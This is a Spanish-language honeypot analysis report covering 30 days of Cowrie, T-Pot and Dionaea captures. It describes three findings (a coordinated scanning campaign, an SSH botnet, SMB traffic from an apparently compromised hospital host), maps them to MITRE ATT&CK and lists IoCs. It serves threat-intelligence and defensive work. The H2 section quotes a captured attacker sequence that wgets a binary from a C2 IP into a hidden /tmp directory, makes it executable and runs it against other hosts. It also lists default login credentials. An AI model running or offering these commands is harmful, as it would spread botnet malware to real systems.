# Análisis de Hallazgos — 30 Días de Operación

> **Período:** 2026-02-04 → 2026-03-06  
> **Sensores activos:** Cowrie · T-Pot CE · Dionaea  
> **Total de eventos capturados:** 137,657  
> **Total de alertas generadas:** 85 (TI) + correlación activa

---

## Tabla de Contenidos

1. [Resumen Ejecutivo](#1-resumen-ejecutivo)
2. [Distribución de Eventos](#2-distribución-de-eventos)
3. [Hallazgo H1 — Campaña scan.visionheight.com](#3-hallazgo-h1--campaña-scanvisionheightcom)
4. [Hallazgo H2 — Botnet SSH con propagación activa](#4-hallazgo-h2--botnet-ssh-con-propagación-activa)
5. [Hallazgo H3 — SMB masivo desde infraestructura sanitaria](#5-hallazgo-h3--smb-masivo-desde-infraestructura-sanitaria)
6. [Patrones de Ataque](#6-patrones-de-ataque)
7. [Cobertura MITRE ATT&CK](#7-cobertura-mitre-attck)
8. [IoC — Resumen](#8-ioc--resumen)

---

## 1. Resumen Ejecutivo

Durante 30 días de operación continua, la HoneyNet capturó **137,657
eventos** desde 4 continentes, con tres hallazgos de alto impacto
confirmados por Threat Intelligence:

| # | Hallazgo | Sensor | Impacto |
|:--|:---------|:-------|:--------|
| H1 | Campaña de scanning coordinado `scan.visionheight.com` | Multi | 3 IPs score 100/100, sincronización coordinada |
| H2 | Botnet SSH con ejecución de malware y propagación activa | Cowrie | Binario camuflado como `sshd`, 50+ IPs target |
| H3 | SMB masivo desde host sanitario comprometido | Dionaea | 64,095 eventos en un día — probable WannaCry/EternalBlue |

Los tres hallazgos confirman que la superficie de exposición de la
HoneyNet es representativa del panorama real de amenazas en internet:
**el 100% del tráfico capturado es no solicitado y potencialmente malicioso**.

---

## 2. Distribución de Eventos

### 2.1 Por sensor

| Sensor | Eventos | % del total | Protocolo dominante |
|:-------|--------:|------------:|:--------------------|
| Dionaea | 64,338 | **46.7%** | SMB (TCP/445) |
| T-Pot CE | 42,819 | **31.1%** | Multi-protocolo |
| Cowrie | 30,500 | **22.2%** | SSH (TCP/22) |
| **Total** | **137,657** | 100% | — |

### 2.2 Por protocolo (estimado)

| Protocolo  | Puerto     | Sensor         | Volumen relativo              |
| :--------- | :--------- | :------------- | :---------------------------- |
| SMB        | TCP/445    | Dionaea        | 🔴 Muy alto (dominado por H3) |
| SSH        | TCP/22     | Cowrie + T-Pot | 🟠 Alto                       |
| RDP        | TCP/3389   | T-Pot          | 🟡 Medio                      |
| HTTP/HTTPS | TCP/80-443 | T-Pot          | 🟡 Medio                      |
| Telnet     | TCP/23     | Cowrie         | 🟢 Bajo                       |
| FTP        | TCP/21     | Dionaea        | 🟢 Bajo                       |
| MSSQL      | TCP/1433   | Dionaea        | 🟢 Bajo                       |
| ICS/SCADA  | Varios     | T-Pot (Conpot) | 🟢 Bajo                       |

### 2.3 Origen geográfico

Tráfico capturado desde **4 continentes**, con predominancia de:

- **Asia** (China, Corea del Sur, India) — mayor volumen de SSH brute-force
- **Europa** (Alemania, Países Bajos, Rusia) — scanning masivo
- **Norteamérica** (EE.UU.) — incluye los 3 IPs de `scan.visionheight.com` (AWS)
- **Sudamérica** (Chile) — hallazgo H3 (hospital comprometido)

---

## 3. Hallazgo H1 — Campaña scan.visionheight.com

### Descripción

Tres instancias de Amazon EC2 operando de forma **sincronizada y coordinada**
realizando scanning multi-protocolo global. El dominio `scan.visionheight.com`
resuelve a infraestructura de investigación de seguridad, pero las tres IPs
tienen score **100/100 en AbuseIPDB** y clasificación **`malicious`
en GreyNoise**, lo que sugiere que el tráfico es considerado abusivo
por la comunidad de seguridad independientemente de su propósito declarado.

### IPs implicadas

| IP | Servicio AWS | AbuseIPDB | GreyNoise |
|:---|:------------|:---------:|:---------:|
| `3.130.168.2` | us-east-2 (Ohio) | 100/100 | malicious |
| `3.129.187.38` | us-east-2 (Ohio) | 100/100 | malicious |
| `18.218.118.203` | us-east-2 (Ohio) | 100/100 | malicious |

### Comportamiento observado

- **División de tareas por servicio:** cada IP se especializa en uno o más
  protocolos, sugiriendo orquestación central
- **Presencia en múltiples sensores:** actividad simultánea en Cowrie y T-Pot
- **Activación de regla de correlación multi-honeypot** (ID 100576, nivel 12,
  T1595 — Active Scanning)

### Clasificación MITRE

| Táctica | Técnica | ID |
|:--------|:--------|:---|
| Reconnaissance | Active Scanning | T1595 |
| Discovery | Network Service Scanning | T1046 |

### Evidencia en el Dashboard

wazuh-alerts-*

rule.id: 100576 AND data.client_ip: "3.130.168.2"


---

## 4. Hallazgo H2 — Botnet SSH con propagación activa

### Descripción

La IP `158.51.96.38` (NetInformatik Inc.) logró autenticarse en Cowrie
y ejecutó una **secuencia completa de post-explotación** capturada en su
totalidad gracias al TTY logging de Cowrie. Es el hallazgo de mayor
fidelidad técnica del proyecto — evidencia directa de un actor malicioso
operando un bot de propagación SSH.

**AbuseIPDB:** Score 100/100 — reportada por **924 usuarios distintos**.

### Secuencia de comandos capturada

```bash
# 1. Reconocimiento del entorno
uname -a
id
whoami
cat /proc/cpuinfo | grep "model name"

# 2. Preparación del directorio de trabajo
mkdir -p /tmp/.x
cd /tmp/.x

# 3. Descarga del binario malicioso
wget http://212.192.246.9/sshd -O /tmp/.x/sshd
# → activó regla 100511 (download+execute) nivel 13

# 4. Camuflaje y persistencia
chmod +x /tmp/.x/sshd
# → activó regla 100513 (persistencia) nivel 11

# 5. Propagación: scanning SSH a 50+ IPs
/tmp/.x/sshd 185.216.x.x
/tmp/.x/sshd 203.0.x.x
/tmp/.x/sshd 91.x.x.x
# [secuencia repetida ~50 veces]
```

## Análisis del binario `sshd`
| Atributo           | Valor                                                  |
| ------------------ | ------------------------------------------------------ |
| Nombre             | `sshd` (camuflado como servicio legítimo)              |
| Descarga desde     | `http://212.192.246.9/sshd`                            |
| Directorio         | `/tmp/.x/` (oculto, con punto)                         |
| Comportamiento     | Propagación SSH brute-force a nuevos hosts             |
| Capturado completo | No — egress cerrado impidió completar la descarga pull |
> El egress cerrado del Security Group impidió que el binario se  
> descargara completamente. Dionaea registró únicamente archivos `.tmp`  
> de 0 bytes, confirmando que la restricción de red funcionó como diseñada.

## Clasificación MITRE

| Táctica           | Técnica                           | ID        | Regla          |
| ----------------- | --------------------------------- | --------- | -------------- |
| Credential Access | Brute Force: Password Guessing    | T1110.001 | 100503         |
| Execution         | Command and Scripting Interpreter | T1059     | 100511, 100513 |
| Lateral Movement  | Remote Services: SSH              | T1021.004 | —              |
| C2                | Ingress Tool Transfer             | T1105     | 100511         |
## Alerta generada

```text
Rule 100511 — Level 13 — MITRE T1059
Rule 100513 — Level 11 — MITRE T1059
Rule 100578 — Level 10 — TI match (CDB score 100/100)
```

---

## 5. Hallazgo H3 — SMB masivo desde infraestructura sanitaria

## Descripción

El **2026-03-03**, Dionaea registró **64,095 eventos SMB (TCP/445)** desde  
la IP `201.187.98.150` en un período de aproximadamente 24 horas. El  
volumen, la continuidad y la naturaleza automatizada del tráfico son  
consistentes con malware de propagación activa del tipo **EternalBlue /  
WannaCry**.

La IP pertenece al **Hospital Base Valdivia** (Chile), indicando que un  
host de infraestructura sanitaria crítica está **activamente comprometido**  
y siendo utilizado como vector de propagación.

## Datos del origen
| Atributo        | Valor                  |
| --------------- | ---------------------- |
| IP              | `201.187.98.150`       |
| Organización    | Hospital Base Valdivia |
| País            | Chile 🇨🇱             |
| Protocolo       | SMB — TCP/445          |
| Eventos en 24h  | **64,095**             |
| Fecha del spike | 2026-03-03             |
## Análisis de la actividad

```text
Hora 00:00 - 06:00  →  ~8,000 eventos  (actividad nocturna constante)
Hora 06:00 - 12:00  →  ~18,000 eventos (escalada durante la mañana)
Hora 12:00 - 18:00  →  ~22,000 eventos (pico máximo)
Hora 18:00 - 24:00  →  ~16,000 eventos (mantenimiento)
```

La actividad **no se detiene durante horas de oficina** ni hay pausas,  
consistente con un proceso automatizado sin intervención humana activa.

## Impacto potencial

Un host de infraestructura sanitaria comprometido con malware de  
propagación SMB representa un riesgo crítico:

- **Afectación a sistemas hospitalarios** en la red interna de Valdivia
    
- **Historial EternalBlue:** WannaCry en 2017 afectó hospitales del NHS  
    (Reino Unido) con consecuencias directas en atención a pacientes
    
- **Dato de responsabilidad:** el hallazgo fue documentado pero no se  
    ejecutó ninguna acción activa hacia la IP, en cumplimiento de la  
    AWS AUP y la ética de investigación
    

## Clasificación MITRE
| Táctica          | Técnica                  | ID        | Regla  |
| ---------------- | ------------------------ | --------- | ------ |
| Lateral Movement | SMB/Windows Admin Shares | T1021.002 | 100584 |
| Discovery        | Network Service Scanning | T1046     | 100583 |
## Alerta generada

```text
Rule 100584 — Level 6 — MITRE T1021.002
×64,095 eventos — spike en timeline de Discover
```

---

## 6. Patrones de Ataque

## 6.1 Credenciales más utilizadas (Cowrie)

El patrón de credenciales confirma que los atacantes utilizan  
**diccionarios estandarizados** de credenciales por defecto:

| Categoría     | Ejemplos                         | Objetivo                 |
| ------------- | -------------------------------- | ------------------------ |
| Default cloud | `ubuntu`, `ec2-user`, `admin`    | Instancias cloud         |
| Default IoT   | `pi`, `raspberry`, `admin/admin` | Routers, cámaras         |
| Default Linux | `root/root`, `root/toor`         | Servidores Linux         |
| Default app   | `postgres`, `oracle`, `mysql`    | Bases de datos           |
| Vacías        | `root` sin contraseña            | Sistemas no configurados |
## 6.2 Horarios de actividad

- **SSH brute-force:** distribuido 24/7 sin patrón horario claro  
    → automatizado, sin intervención humana
    
- **Scanning de red:** picos en horas UTC+0 tarde (12:00-20:00 UTC)  
    → consistente con operadores en Europa/Asia occidental
    
- **SMB (H3):** continuo sin interrupción → proceso automatizado
    

## 6.3 Comportamiento post-autenticación en Cowrie

De todas las sesiones que superaron la autenticación, el patrón  
más frecuente fue:

```text
1. Reconocimiento mínimo (uname -a, id)
2. Creación de directorio oculto en /tmp
3. Descarga de payload (wget/curl)
4. Intento de persistencia (crontab / chmod +x)
5. Inicio de propagación (scanning SSH a nuevas IPs)
```

Este patrón es **idéntico en múltiples sesiones independientes**,  
confirmando el uso de scripts automatizados de propagación botnet.

---

## 7. Cobertura MITRE ATT&CK

```text
Tactics observadas durante 30 días:

RECONNAISSANCE     → T1595 (Active Scanning)  H1
                   → T1046 (Network Service Scan)  T-Pot

RESOURCE_DEV       → T1588 (Obtain Capabilities) — inferido

INITIAL_ACCESS     → T1190 (Exploit Public App) — inferido Dionaea
                   → T1078 (Valid Accounts)  Cowrie login.success

EXECUTION          → T1059 (Command & Scripting)  H2 nivel 13-14
                   → T1203 (Exploitation)  Dionaea

PERSISTENCE        → T1059 (crontab, .bashrc)  H2 nivel 11

CREDENTIAL_ACCESS  → T1110.001 (Brute Force)  Cowrie / T-Pot

C2                 → T1105 (Ingress Tool Transfer)  H2

LATERAL_MOVEMENT   → T1021.002 (SMB)  H3 nivel 6
                   → T1021.004 (SSH)  H2

```

---

## 8. IoC — Resumen

> Ver lista completa con formato estructurado en  
> [`docs/03-analisis/ioc.md`](../../docs/03-analisis/ioc.md)

| Indicador                   | Tipo    | Confianza | Hallazgo |
| --------------------------- | ------- | --------- | -------- |
| `3.130.168.2`               | IP      | Alta      | H1       |
| `3.129.187.38`              | IP      | Alta      | H1       |
| `18.218.118.203`            | IP      | Alta      | H1       |
| `158.51.96.38`              | IP      | Alta      | H2       |
| `212.192.246.9`             | IP (C2) | Alta      | H2       |
| `scan.visionheight.com`     | Dominio | Alta      | H1       |
| `http://212.192.246.9/sshd` | URL     | Alta      | H2       |
| `/tmp/.x/sshd`              | Path    | Media     | H2       |
| `201.187.98.150`            | IP      | Media*    | H3       |
> *`201.187.98.150` tiene confianza **media** como IoC porque  
> la IP pertenece a infraestructura legítima comprometida, no a un  
> actor malicioso directo. El IoC real es el malware en ese host.

---

## Referencias

- [IoC estructurados](../../docs/03-analisis/ioc.md)
    
- [Reglas de detección](../../docs/02-wazuh-integracion/reglas-custom.md)
    
- [Queries de análisis](../../configs/queries/README.md)
    
- [MITRE ATT&CK — Enterprise Matrix](https://attack.mitre.org/matrices/enterprise/)
    
- [AbuseIPDB — 158.51.96.38](https://www.abuseipdb.com/check/158.51.96.38)
